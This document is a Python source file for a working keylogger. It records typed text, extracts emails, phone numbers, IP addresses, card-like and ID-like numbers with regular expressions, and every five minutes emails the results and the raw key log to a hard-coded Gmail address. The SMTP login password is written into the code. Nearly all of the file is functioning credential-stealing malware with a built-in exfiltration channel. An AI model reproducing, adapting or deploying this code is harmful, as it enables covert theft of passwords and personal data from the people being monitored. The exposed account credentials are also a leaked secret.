import os
import time
import keyboard
import re
import threading
from collections import Counter
from queue import Queue

# ===================================================== File Existence Handling =====================================================


def check_and_create_file(valuable_info, keysniffer_data, retries=3, delay=2):
    for attempt in range(retries):
        if not os.path.exists(valuable_info):
            with open(valuable_info, "w") as file:
                file.write("")  # Create an empty file
            print(f"Created missing file: {valuable_info}")

        if not os.path.exists(keysniffer_data):
            with open(keysniffer_data, "w") as file:
                file.write("")  # Create an empty file
            print(f"Created missing file: {keysniffer_data}")

        if os.path.exists(valuable_info) and os.path.exists(keysniffer_data):
            print(f"Both files are present: {valuable_info}, {keysniffer_data}")
            return True
        else:
            print(
                f"Files not found or created: {valuable_info}, {keysniffer_data}. Retrying {attempt + 1}/{retries}..."
            )
            time.sleep(delay)

    print(f"Failed to ensure both files exist: {valuable_info}, {keysniffer_data}")
    return False


# ===================================================== Basic keylogger ================================================

path = os.path.abspath("keysniffer_data.txt")
key_data_queue = Queue()  # Queue to store keypresses for filtering


def keylogger():
    try:
        while True:
            events = keyboard.record("enter")  # Record until "enter" key is pressed
            password = list(keyboard.get_typed_strings(events))
            key_data_queue.put(password[0])  # Put the recorded password into the queue
            time.sleep(0.1)  # Small delay to avoid overloading the system
    except KeyboardInterrupt:
        print("Keylogger stopped.")


# ===================================================== Filter and Extract Valuable Info ====================================


def extract_valuable_info(keysniffer_data, filtered_data):
    extracted_data = {
        "emails": [],
        "phone_numbers": [],
        "urls": [],
        "credit_cards": [],
        "ip_addresses": [],
        "dates": [],
        "social_security_numbers": [],
        "common_words": [],
    }

    # Define patterns for valuable information
    patterns = {
        "emails": r"[\w.-]+@(gmail\.com|hotmail\.com)",
        "phone_numbers": r"\+?(\d{1,3}[- ]?)?(\d{9,})",
        "urls": r"https?://[\w.-]+(?:\.[\w.-]+)+[/\w.-]*",
        "credit_cards": r"\bLU\d{18}\b",
        "ip_addresses": r"\b(?:\d{1,3}\.){3}\d{1,3}\b",
        "dates": r"\b(?:\d{2}[-/.]?\d{2}[-/.]?\d{4})\b",
        "social_security_numbers": r"\b\d{13}\b",
    }

    while True:
        # Process data as it comes in from the queue
        if not key_data_queue.empty():
            data = key_data_queue.get()  # Get data from the queue

            for key, pattern in patterns.items():
                matches = re.findall(pattern, data)
                extracted_data[key].extend(matches)

            # Most common words typed
            words = re.findall(r"\b\w+\b", data)
            common_words = Counter(words).most_common(10)
            extracted_data["common_words"].extend(common_words)

            # Write the extracted data to the output file
            if os.path.exists(filtered_data):
                with open(filtered_data, "w") as filtered_file:
                    for category, items in extracted_data.items():
                        filtered_file.write(f"{category.capitalize()}:\n")
                        for item in items:
                            filtered_file.write(f"  {item}\n")
                        filtered_file.write("\n")

                    # Empty the keysniffer data file after sending
                    with open("keysniffer_data.txt", "w") as file:
                        file.truncate(0)
                    print("File emptied successfully after sending.")

        time.sleep(1)  # Small delay to avoid overloading the system


# ===================================================== Sending the Filtered Data via Email ====================================

import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

sender_email = "7unkym0nk3y@gmail.com"
receiver_email = "7unkym0nk3y@gmail.com"
filtered_data_file = "valuable_info.txt"


def send_email():
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = "File Attachments: valuable_info.txt and keysniffer_data.txt"

    email_body = """<html><body><p>Please find the attached files containing filtered data and keylogger data.</p></body></html>"""
    message.attach(MIMEText(email_body, "html"))

    with open(filtered_data_file, "rb") as file:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(file.read())
        encoders.encode_base64(part)
        part.add_header(
            "Content-Disposition", f"attachment; filename={filtered_data_file}"
        )
        message.attach(part)

    with open("keysniffer_data.txt", "rb") as file:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(file.read())
        encoders.encode_base64(part)
        part.add_header(
            "Content-Disposition", f"attachment; filename=keysniffer_data.txt"
        )
        message.attach(part)

    try:
        with smtplib.SMTP("smtp.gmail.com:587") as server:
            server.starttls()
            server.login(sender_email, "ixtzymqtphizlcet")
            server.sendmail(sender_email, receiver_email, message.as_string())
            print("Email sent successfully.")
    except Exception as e:
        print(f"An error occurred: {e}")


def send_email_periodically():
    while True:
        send_email()
        time.sleep(300)  # Send email every 5 minutes


# ===================================================== Running the Program ======================================================

import threading

if __name__ == "__main__":

    if check_and_create_file("valuable_info.txt", "keysniffer_data.txt"):

        try:
            keylogger_thread = threading.Thread(target=keylogger, daemon=True)
            filter_thread = threading.Thread(
                target=extract_valuable_info,
                daemon=True,
                args=("keysniffer_data.txt", "valuable_info.txt"),
            )
            email_thread = threading.Thread(target=send_email_periodically, daemon=True)

            keylogger_thread.start()
            filter_thread.start()
            email_thread.start()

            keylogger_thread.join()
            filter_thread.join()
            email_thread.join()

        except KeyboardInterrupt:
            print("Program stopped.")
